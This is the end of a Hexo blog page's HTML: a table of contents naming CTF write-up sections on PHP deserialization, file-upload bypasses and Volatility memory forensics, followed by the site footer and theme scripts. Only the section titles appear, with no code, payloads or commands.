href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="nav-number">1.0.17.1.</span> <span class="nav-text">序列化和反序列化是什么？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#POP%E9%93%BE%E6%9E%84%E9%80%A0"><span class="nav-number">1.0.17.2.</span> <span class="nav-text">POP链构造</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unserialize1"><span class="nav-number">1.0.17.3.</span> <span class="nav-text">unserialize1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#OC%E7%BB%95%E8%BF%87%E3%80%81wake-up%E7%BB%95%E8%BF%87"><span class="nav-number">1.0.17.4.</span> <span class="nav-text">OC绕过、wake up绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.0.18.</span> <span class="nav-text">文件上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#htaccess%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90"><span class="nav-number">1.0.18.1.</span> <span class="nav-text">.htaccess任意文件解析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%AD%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87"><span class="nav-number">1.0.18.2.</span> <span class="nav-text">短标签绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87-UTF-7"><span class="nav-number">1.0.18.3.</span> <span class="nav-text">特殊编码绕过(UTF-7)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-number">1.0.18.4.</span> <span class="nav-text">双写绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#user-ini%E7%BB%95%E8%BF%87"><span class="nav-number">1.0.18.5.</span> <span class="nav-text">.user.ini绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#htaccess%E6%96%87%E4%BB%B6%E6%8D%A2%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="nav-number">1.0.18.6.</span> <span class="nav-text">.htaccess文件换行绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.1.</span> <span class="nav-text"></span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%A7%A3%E7%A0%81Base64"><span class="nav-number">1.1.0.1.</span> <span class="nav-text">文件包含解码Base64</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E6%8B%BC%E6%8E%A5%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4"><span class="nav-number">1.1.0.2.</span> <span class="nav-text">动态拼接函数绕过函数过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%BE%E7%89%87%E5%A4%B4%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.0.3.</span> <span class="nav-text">图片头绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XMB%E6%96%87%E4%BB%B6%E5%A4%B4%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.0.4.</span> <span class="nav-text">XMB文件头绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GIF89a"><span class="nav-number">1.1.0.5.</span> <span class="nav-text">GIF89a</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc"><span class="nav-number">1.1.1.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Ez-qr"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">Ez-qr</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">内存取证</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%8E%E5%AE%9E%E6%88%98%E4%B8%AD%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8Volatility"><span class="nav-number">1.1.1.2.1.</span> <span class="nav-text">从实战中学习使用Volatility</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E9%95%9C%E5%83%8F%E4%BF%A1%E6%81%AF"><span class="nav-number">1.1.1.2.2.</span> <span class="nav-text">查看镜像信息</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF"><span class="nav-number">1.1.1.2.3.</span> <span class="nav-text">获取进程信息</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8F%90%E5%8F%96%E8%BF%9B%E7%A8%8Bdump"><span class="nav-number">1.1.1.2.4.</span> <span class="nav-text">提取进程dump</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#cmdscan"><span class="nav-number">1.1.1.2.5.</span> <span class="nav-text">cmdscan</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#filescan"><span class="nav-number">1.1.1.2.6.</span> <span class="nav-text">filescan</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#dump%E6%96%87%E4%BB%B6"><span class="nav-number">1.1.1.2.7.</span> <span class="nav-text">dump文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E6%96%87%E4%BB%B6"><span class="nav-number">1.1.1.2.8.</span> <span class="nav-text">分析文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="nav-number">1.1.1.2.9.</span> <span class="nav-text">其他常用命令</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">John Doe</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">2</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
